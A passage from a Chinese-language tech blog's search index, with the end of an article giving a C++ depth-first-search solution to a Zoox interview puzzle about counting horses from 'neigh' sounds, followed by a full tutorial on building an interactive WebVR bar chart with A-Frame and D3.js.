但我們的解法很明顯不可能產生 invalid，因為我們假設了每一個 n 一定都會有 一個 h 結尾。於是我們要來探討解答二。
解法二 - Depth First Search既然剛剛的解法一不適用於不 valid 的情況，那我們就要來想想有哪些是需要考慮的 invalid case：

neigh 這 5 個 char 在整個字串中出現的次數不一致 (如果只有這種 invalid case，那可以先走過一次字串確認出現次數都一樣，再用解法一)
neigh 這 5 個 char 在整個字串中出現的次數正確，但順序不對 (例如可能出現 eighn，雖然每個 char 出現的次數都對，但內容錯了)

因為有這兩種 invalid case，所以我們不能只是去算次數，而是得去追蹤到底每一個字母對應到哪匹馬，從而確認到底是不是 valid，並且在過程中持續記錄目前同時有幾匹馬在叫。
在下面的實作當中，我們用 expect 來記錄目前有在追蹤的馬叫到哪一個字母，然後在遇到錄音裡面新的字母時，我們就可以根據 expect 裡面記錄的字母來判斷新的字母可以是分配給哪一匹馬。
實作如下：
#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;char next(char c) &#123;  char n;    switch(c) &#123;    case &#x27;n&#x27; :      n = &#x27;e&#x27;;      break;    case &#x27;e&#x27; :      n = &#x27;i&#x27;;      break;    case &#x27;i&#x27; :      n = &#x27;g&#x27;;      break;    case &#x27;g&#x27; :      n = &#x27;h&#x27;;      break;    case &#x27;h&#x27; :      n = &#x27;#&#x27;;      break;  &#125;  return n;&#125;void helper(string s, int pos, string expect, int local_max, int &amp;max_horses) &#123;  if (pos == s.length() &amp;&amp; expect.length() == 0 &amp;&amp; local_max &gt; max_horses) &#123;    max_horses = local_max;    return;  &#125;  if (pos &gt;= s.length()) &#123;    return;  &#125;    char c = s[pos];  if(c == &#x27;n&#x27;) &#123;    string new_expect = expect + c;    int new_local_max = local_max;    if(new_expect.length() &gt; local_max) &#123;      new_local_max = new_expect.length();    &#125;    helper(s, pos+1, new_expect, new_local_max, max_horses);  &#125;  else &#123;    for(int i=0; i&lt;expect.length(); i++) &#123;      char val = expect[i];      if (c == next(val)) &#123;        if(c == &#x27;h&#x27;) &#123;          string new_expect = &quot;&quot;;          for(int j=0; j&lt;expect.length(); j++) &#123;            if(j == i) continue;            new_expect += expect[j];          &#125;          helper(s, pos+1, new_expect, local_max, max_horses);        &#125; else &#123;          expect[i] = next(val);          helper(s, pos+1, expect, local_max, max_horses);          expect[i] = val;        &#125;      &#125;    &#125;  &#125;&#125;int main() &#123;  string s = &quot;neigneighh&quot;;  int max_horses = 0;  helper(s, 0, &quot;&quot;, 0, max_horses);  if(max_horses == 0) cout &lt;&lt; &quot;Invalid record.\n&quot;;  else cout &lt;&lt; &quot;There are at least &quot; &lt;&lt; max_horses &lt;&lt; &quot; horses in the yard.\n&quot;;  return 0;&#125;

總結今天跟大家介紹了 ZOOX 喜歡出的 OA 題目跟解答，雖然分享了這篇文章，但我想傳達的概念並不是 “面試前，要把這公司所有考古題都練習過”，而只是單純地好奇 ZOOX 會出什麼樣的題目，這些題目怎麼用基礎的演算法 &amp; 資料結構能力來處理。
關於準備面試的 mindset，我推薦可以看看 我是如何拿到矽谷頂級科技公司的10 個 offer 的，裡面講到把 Leetcode 前 150 題融會貫通就能應付無窮題目變化的觀念，非常值得體會跟實作。
延伸閱讀
[面試經驗] 自動駕駛公司 Aurora Onsite
[面試經驗] DeepScale 自動駕駛公司 OA 
Top Self Driving Car Startups
Zoox Can Cruise San Francisco Without Drivers. Now It Needs Money

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>ZOOX, Online Assessment, Interview</tag>
      </tags>
  </entry>
  <entry>
    <title>D3v4 工作坊 - WebVR 與資料視覺化</title>
    <url>/2017/09/23/webvr-d3/</url>
    <content><![CDATA[前言Q2 的時候稍微玩了一下 WebVR，主要是瞭解了 Mozilla 主導推出的 A-Frame，驚訝於其簡單方便的 API 設計外，也一直在想還能做什麼有趣的應用，直到最近在構思 D3 的一些範例時，才突然又再想起 WebVR：既然 A-Frame 提供了一系列的 VR DOM object，而 D3.js 又能操作 DOM，那理論上一起使用是沒有問題的。
果不其然，稍稍在網路搜尋一下就看到 WSJ 的這篇 Is the Nasdaq in Another Bubble?
超酷的呀，視覺化股票歷史資料，做成雲霄飛車般的閱讀體驗，雖然我個人覺得資料視覺化應該要以宏觀角度來讓他人清楚了解整個脈絡，VR 的「個人」視角，限制了這部分的特性，但若以 Story telling 的角度來看，VR 加上數據視覺化反倒為使用者帶來更豐富生動的閱讀經驗，不僅僅是瞭解內容，過程有趣才能在碎片資訊爆炸的時代抓住人們的眼球！
在這個想法下就決定來嘗試看看用 A-Frame 與 D3 來製作資料視覺化，雖然還沒辦法做出太絢麗的互動體驗，但出發總要有個開始，就先試試最簡單的 Bar Chart 吧！
最後會長這樣：

前置作業有摸過 A-Frame 的讀者應該很清楚要建立出一個 VR 場景有多簡單：沒摸過的也歡迎回去看這篇 WebVR 101
See the Pen WebVR-D3-I by Arvin (@arvin0731) on CodePen.


加入 D3回想一下，一般在使用 D3 的時候，就是選取出你要操作的 svg 元件，接著將進入 enter() 狀態的資料 append 上去，然後調整 Style 與 attributes。
那在 A-Frame 當中我們也可以如法泡製：
// 就像是以前選取 svg 一樣，只是在 VR 中我們要選取 a-sceneconst scene = d3.select(&#x27;a-scene&#x27;);// 處理資料與 DOM 元素的方式與平時操作 d3 相同，一樣的 enter/update/exit 狀態const bars = scene.selectAll(&#x27;a-box.bar&#x27;).data(data);// 真正 append 資料並設定屬性bars.enter().append(&#x27;a-box&#x27;).classed(&#x27;bar&#x27;, true)  .attr(&#x27;position&#x27;, (d, i) =&gt; &#123;  const x =  i * 0.8 - (data.length / 2);  const y = hscale(d)/2;  const z = -3  return x + &quot; &quot; + y + &quot; &quot; + z   &#125;)  .attr(&#x27;width&#x27;, (d) =&gt; 0.5)  .attr(&#x27;depth&#x27;, (d) =&gt; 0.5)  // hscale 就只是個 d3 的 scaleLinear 映射函數  .attr(&#x27;height&#x27;, (d) =&gt; hscale(d))  .attr(&#x27;opacity&#x27;, alpha)  .attr(&#x27;color&#x27;, &#x27;blue&#x27;);

首先我們 select 出 a-scene，接著在其下面預先將資料 binding 到擁有 bar 這個 classname 的 a-box entity 內（此時還是虛擬的 DOM 物件），最後再呼叫 enter() 來真正的將資料 append 到 DOM 上面。
這邊有兩個小地方需要注意：

除了寬（width）與高（height）外，還有深度（depth）需要設定，畢竟現在是在 3D 的世界中。
數值的設定：在 WebVR API 中，回傳的距離資料以 Meter 為單位，因此在 A-frame 中的距離單位也是 Meter，並非一般頁面的 pixel，因此我們的 x, y, z 值記得不能設定太大。

結果如下：
See the Pen WebVR-D3-II by Arvin (@arvin0731) on CodePen.


簡單幾行 code 就能夠在 VR 的世界內呈現資料圖表囉！
互動元素平面的 D3 能夠互動，VR 版當然也要。
在 VR 裡面的 Cursor 基本上是跟著你的攝影機（camera），你可以直接用 A-Frame 提供的 entity，就可以有基本的 gaze-based cursor（凝視型），顧名思義，也就是以你的視線為中心的 cursor，並且可以觸發 mouseenter, mouseleave 等事件:
&lt;a-camera&gt;    &lt;a-cursor&gt;&lt;/a-cursor&gt;&lt;/a-camera&gt;

或是自己 create 一個 cursor entity：source
&lt;a-entity position=&quot;0 1 0&quot; rotation=&quot;0 0 0&quot;&gt;    &lt;a-entity camera look-controls wasd-controls&gt;        &lt;a-entity cursor=&quot;fuse: true; fuseTimeout: 500&quot;                position=&quot;0 0 -2&quot;                geometry=&quot;primitive: ring; radiusInner: 0.02; radiusOuter: 0.027&quot;                material=&quot;color: black; shader: flat&quot;&gt;        &lt;/a-entity&gt;    &lt;/a-entity&gt;&lt;/a-entity&gt;

要注意的是，由於我們需要設定 cursor 與 camera 的位置，所以將這兩個 entity 都包在另一個 entity 下，並由最上層的 entity 來設定初始 position 會較為方便。
而在 cursor 這個 entity 上我們設定了幾個屬性：

cursor：設定為 fuse: true，即代表 gaze-based cursor，會跟著你視線移動，並且當你「盯著」某個點一段時間（fuseTimeout）後，會觸發 Click event。
material：可以設定其顏色材質。
geometry：設定其物理形狀。

當然如果你是用 Vive, daydream 的 controller，也已有其相對應的 entity 可以使用，可以參考這份文件 (laser-controls)[https://aframe.io/docs/0.7.0/components/laser-controls.html]
設定好 cursor 後，接著就是在我們的 bar 上面設置 event listener 了。
在剛剛的 attr 後面再接著利用 on 來設定 listener：
bars.enter().append(&#x27;a-box&#x27;).classed(&#x27;bar&#x27;, true)    .attr(&#x27;position&#x27;, (d, i) =&gt; &#123;        const x =  i * 0.8 - (data.length / 2);        const y = hscale(d)/2;        const z = -3;        return x + &quot; &quot; + y + &quot; &quot; + z;    &#125;)    .attr(&#x27;width&#x27;, (d) =&gt; 0.5)    .attr(&#x27;depth&#x27;, (d) =&gt; 0.5)    .attr(&#x27;height&#x27;, (d) =&gt; hscale(d))    .attr(&#x27;opacity&#x27;, alpha)    .attr(&#x27;color&#x27;, &#x27;blue&#x27;)    .on(&quot;mouseenter&quot;, function(d,i) &#123;        d3.select(this).transition().duration(10)        .attr(&#x27;opacity&#x27;, 0.9);        d3.select(this).append(&quot;a-text&quot;)        .attr(&#x27;color&#x27;, &#x27;red&#x27;)        .attr(&#x27;align&#x27;, &#x27;center&#x27;)        .attr(&#x27;position&#x27;, `0 $&#123;(hscale(d) / 2 + 0.5)&#125; 0`)        .attr(&#x27;scale&#x27;, &#x27;1 1 1&#x27;)        .attr(&#x27;value&#x27;, `$&#123;dataText[i]&#125;, $&#123;d&#125;`);    &#125;)    .on(&quot;mouseleave&quot;, function(d,i) &#123;        d3.select(this).transition().duration(500)        .attr(&#x27;opacity&#x27;, alpha);        d3.select(this).select(&quot;a-text&quot;).remove();    &#125;)

上面做的事情很簡單，在 mouseenter 時，我們 append 上一個 &lt;a-text&gt;，並設定顏色位置等等，然後套用一個 transition 動畫來改變 bar 的顏色，mouseleave 時把 style 還原。
如此一來你就有了一個可以互動的 VR bar chart 了！
See the Pen WebVR-D3-II by Arvin (@arvin0731) on CodePen.


Component 化我做到這邊的時候突然有個想法，既然 A-frame 可以讓我們自己客製化 Entity 內要放的 component，那我們能不能將剛剛的 code 全部塞進 component 內呢？
還記得在 WebVR 101 中有記錄到我們可以透過 AFRAME 這個全域變數來註冊 component，並放入 &lt;a-entity&gt; 中：reference
barchart.jsAFRAME.registerComponent(&#x27;barchart&#x27;, &#123;    schema: &#123;        json: &#123;            default: &#123;                    key: [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;],                    value: [19, 80, 30, 15, 55]                &#125;            &#125;    &#125;,    init: function () &#123;        this.generate();    &#125;,    generate: function () &#123;        const json = this.data.json;        const el = this.el;        // default alpha for bars        const alpha = 0.6;        const data = json.value;        const dataText = json.key;        // Select the current enity object just like an svg        const currentEntity = d3.select(el);        // we use d3&#x27;s enter/update/exit pattern to draw and bind our dom elements        const bars = currentEntity.selectAll(&#x27;a-box.bar&#x27;).data(data);        /*        ...         這邊放入上面所撰寫的 D3 相關的程式碼        */    &#125;    &#125;);


schema: 這邊是用來設定此 entity 的 properties，像是能透過設置 json 屬性來傳入資料 &lt;a-entity barchart=&quot;json: data.json&quot;&gt;&lt;/a-entity&gt;。同時你也可以在這邊設定 default 的屬性值。

init: Component 在初始階段會呼叫此函數一次，用來初始變數或是 component 的狀態，以我們這邊的例子就是用來呼叫 d3 繪製圖表。  （Component 還有許多 lifecycle：update, remove, tick, play, pause, updateSchema，可以參考官方文件）

generate: 這邊就是我們用來處理 D3 圖表的函式。


在這邊比較需要了解的是 schema property 與 Component 本身的 HTML Element 的存取方式：我們在 schema 中定義的屬性都會存在於 this.data 中，因此我們可以透過 this.data.json 來取得 json 屬性的資料；而 this.el 則是回傳 Component 本身的 HTML Element，我們要用來給 D3 進行 DOM object 操作的。
當你註冊好 component 後，在我們的 HTML 中就只需要放置 &lt;a-entity barchart&gt;&lt;/a-entity&gt; 就可以產生圖表了！
（唯一要注意的是，你的 component 一定要在 &lt;a-sene&gt; render 之前就處理好，最好是放在 &lt;head&gt; 的位置。
你之後只要將剛剛創建的 component export 出去，就可以讓任何人透過 &lt;a-entity barchart&gt;&lt;/a-entity&gt; 的方式來使用。而且透過 property 的設定，我們可以傳入不同資料，甚至是顏色設定等等的屬性，來進行客製化的圖表！
像是可以產生一個 104 年台灣年齡人口數統計長條圖：
只要在 html 中加入&lt;a-entity barchart=&quot;json: https://cdn.rawgit.com/ArvinH/f47671a9ff33b6719b043945d36054ac/raw/09a6ea23ee40d4a83205eef6d4fd4e5efa072c2b/104life.json&quot;&gt;&lt;/a-entity&gt; 
稍微修改一下 component 內的 init 函數，因為從 entity 傳來的 property 預設會是 string 的 type：
init: function () &#123;    var self = this;    if (typeof this.data.json === &#x27;string&#x27;) &#123;        fetch(this.data.json)        .then(function(response) &#123;            return response.json();        &#125;).then(function(parsedJson) &#123;            self.generate(parsedJson || this.data.json); // fallback to default        &#125;).catch(function(ex) &#123;            console.log(&#x27;parsing failed&#x27;, ex)        &#125;)    &#125;&#125;,

順便加入一些 color 的處理，成果如下：
See the Pen WebVR-D3-IV by Arvin (@arvin0731) on CodePen.



結論雖然只是簡單的實作一個 Barchart，但透過這次的小嘗試，大概了解該怎麼樣用 D3 與 A-Frame 寫出一個 WebVR Data visulization Component 後，就可以有許多東西可以玩了！或許可以結合現有的 3D modal，並將開放資料用不同的模型呈現，製作出一個 3D VR 版的城市圖表，應該會很有趣！加上他包裹成 Component 的方式非常方便，在社群的努力下，實作上勢必會更加輕鬆（github 上已經有許多人釋出的 component 可以使用）。
預計下一篇會再來做個有趣並複雜一點的 VR 資訊圖表！
資料來源
A-Frame doc
kframe
aframe + d3 test
WebVR 101
Is the Nasdaq in Another Bubble?

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>webvr, A-frame, d3</tag>
      </tags>
  </entry>
</search>
